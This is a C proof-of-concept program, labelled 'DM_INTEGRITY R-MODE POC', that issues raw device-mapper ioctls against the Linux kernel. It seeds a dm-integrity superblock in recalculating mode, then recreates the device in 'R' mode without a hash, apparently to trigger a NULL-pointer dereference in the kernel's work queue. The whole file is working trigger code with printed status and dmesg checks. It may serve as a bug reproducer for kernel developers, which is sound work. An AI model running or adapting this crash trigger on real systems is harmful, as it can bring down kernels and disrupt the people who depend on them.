#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <linux/dm-ioctl.h>

#define DEV "dmx0"

static int ctl_fd = -1;

static int dm_ioctl(int cmd, struct dm_ioctl *dmi, size_t len)
{
	int r;
	dmi->version[0] = 4;
	dmi->version[1] = 0;
	dmi->version[2] = 0;
	dmi->data_size = len;
	dmi->data_start = sizeof(struct dm_ioctl);
	r = ioctl(ctl_fd, cmd, dmi);
	if (r < 0)
		return -errno;
	return 0;
}

static int dm_cmd(int cmd, const char *name)
{
	static char buf[4096];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	if (cmd == DM_DEV_CREATE)
		dmi->flags = DM_PERSISTENT_DEV_FLAG;
	return dm_ioctl(cmd, dmi, sizeof(buf));
}

static int dm_load(const char *name, const char *tt, unsigned long long len,
		   const char *spec)
{
	static char buf[8192];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;
	struct dm_target_spec *s;
	char *p;
	size_t sl;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	dmi->target_count = 1;

	s = (struct dm_target_spec *)(buf + sizeof(struct dm_ioctl));
	s->sector_start = 0;
	s->length = len;
	snprintf(s->target_type, sizeof(s->target_type), "%s", tt);

	p = (char *)s + sizeof(struct dm_target_spec);
	strcpy(p, spec);
	sl = sizeof(struct dm_target_spec) + strlen(spec) + 1;
	sl = (sl + 7) & ~7UL;

	return dm_ioctl(DM_TABLE_LOAD, dmi, sizeof(struct dm_ioctl) + sl);
}

static int dm_suspend(const char *name, int do_suspend)
{
	static char buf[4096];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	dmi->flags = do_suspend ? DM_SUSPEND_FLAG : 0;
	return dm_ioctl(DM_DEV_SUSPEND, dmi, sizeof(buf));
}

static void st(const char *tag, int rc)
{
	printf("%-44s rc=%d errno=%d\n", tag, rc, rc ? errno : 0);
	fflush(stdout);
}

static void dmesg_tail(void)
{
	printf("  ---- dmesg ----\n");
	fflush(stdout);
	if (system("dmesg | grep -iE 'device-mapper|integrity' | tail -5") < 0)
		printf("  (n/a)\n");
	fflush(stdout);
}

int main(void)
{
	int rc;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== DM_INTEGRITY R-MODE POC ===\n");

	ctl_fd = open("/dev/mapper/control", O_RDWR);
	if (ctl_fd < 0) {
		printf("open control failed errno=%d\n", errno);
		return 1;
	}
	printf("control fd=%d\n", ctl_fd);

	dm_cmd(DM_DEV_REMOVE, DEV);
	rc = dm_cmd(DM_DEV_CREATE, DEV);
	st("DM_DEV_CREATE", rc);

	printf("--- STEP 1: seed sb with RECALCULATING (hash+recalculate) ---\n");
	fflush(stdout);
	rc = dm_load(DEV, "integrity", 2048,
		     "/dev/ram0 0 - J 2 internal_hash:sha256 recalculate");
	st("DM_TABLE_LOAD seed", rc);
	if (rc) {
		dmesg_tail();
		printf("=== ABORT seed failed ===\n");
		dm_cmd(DM_DEV_REMOVE, DEV);
		close(ctl_fd);
		return 1;
	}
	rc = dm_suspend(DEV, 0);
	st("resume seed (writes sb)", rc);
	if (rc) dmesg_tail();

	printf("--- STEP 2: suspend + remove (keep sb on disk) ---\n");
	fflush(stdout);
	dm_suspend(DEV, 1);
	st("suspend", 0);
	rc = dm_cmd(DM_DEV_REMOVE, DEV);
	st("DM_DEV_REMOVE (sb stays)", rc);

	printf("--- STEP 3: recreate, load mode=R without hash ---\n");
	fflush(stdout);
	rc = dm_cmd(DM_DEV_CREATE, DEV);
	st("DM_DEV_CREATE #2", rc);

	rc = dm_load(DEV, "integrity", 2048, "/dev/ram0 0 32 R 0");
	st("DM_TABLE_LOAD mode=R no hash", rc);
	if (rc) dmesg_tail();

	rc = dm_suspend(DEV, 0);
	st("resume => queue_work(NULL)?", rc);

	printf("--- survived, dmesg ---\n");
	fflush(stdout);
	dmesg_tail();

	dm_cmd(DM_DEV_REMOVE, DEV);
	close(ctl_fd);
	printf("=== POC DONE ===\n");
	return 0;
}